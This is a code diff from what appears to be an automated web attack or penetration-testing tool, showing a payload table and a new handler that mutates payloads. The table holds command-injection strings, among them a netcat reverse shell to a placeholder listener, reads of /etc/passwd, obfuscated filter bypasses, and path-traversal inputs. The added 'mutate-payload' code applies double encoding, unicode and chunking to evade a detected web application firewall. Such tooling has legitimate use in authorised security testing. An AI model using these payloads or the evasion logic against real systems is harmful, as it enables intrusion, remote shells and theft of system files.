@@ -148,7 +148,7 @@ const PAYLOAD_TEMPLATES = {
   command: {
     linux: ['; ls -la', '| cat /etc/passwd', '`id`', '$(whoami)', '; nc -e /bin/sh LHOST LPORT'],
     windows: ['& dir', '| type C:\\Windows\\System32\\drivers\\etc\\hosts', '& whoami'],
-    bypass: ['l$()s', 'c''a''t /etc/passwd', 'w`echo h`oami']
+    bypass: ['l$()s', "c'a't /etc/passwd", 'w`echo h`oami']
   },
   path_traversal: {
     basic: ['../../../etc/passwd', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'],
@@ -932,6 +932,53 @@ Respond with JSON: {
         };
 
         return new Response(JSON.stringify({ success: true, summary }), {
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+
+      case 'mutate-payload': {
+        const { originalPayload, vulnType, mutations, wafDetected } = data;
+        
+        const mutatedPayloads: any[] = [];
+        
+        // Apply different mutation strategies
+        const strategies = mutations || Object.keys(MUTATION_STRATEGIES);
+        
+        for (const strategy of strategies.slice(0, 5)) {
+          const mutated = applyMutation(originalPayload, strategy);
+          if (mutated !== originalPayload) {
+            mutatedPayloads.push({
+              payload: mutated,
+              strategies: [strategy],
+              original: originalPayload
+            });
+          }
+        }
+        
+        // If WAF detected, add more aggressive mutations
+        if (wafDetected) {
+          const wafMutations = [
+            applyMutation(originalPayload, 'double_encode'),
+            applyMutation(originalPayload, 'unicode'),
+            applyMutation(originalPayload, 'chunked'),
+          ];
+          wafMutations.forEach((m, i) => {
+            if (m !== originalPayload) {
+              mutatedPayloads.push({
+                payload: m,
+                strategies: ['waf_bypass', ['double_encode', 'unicode', 'chunked'][i]],
+                original: originalPayload
+              });
+            }
+          });
+        }
+
+        return new Response(JSON.stringify({ 
+          success: true, 
+          mutations: mutatedPayloads,
+          originalPayload,
+          mutationCount: mutatedPayloads.length
+        }), {
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         });
       }
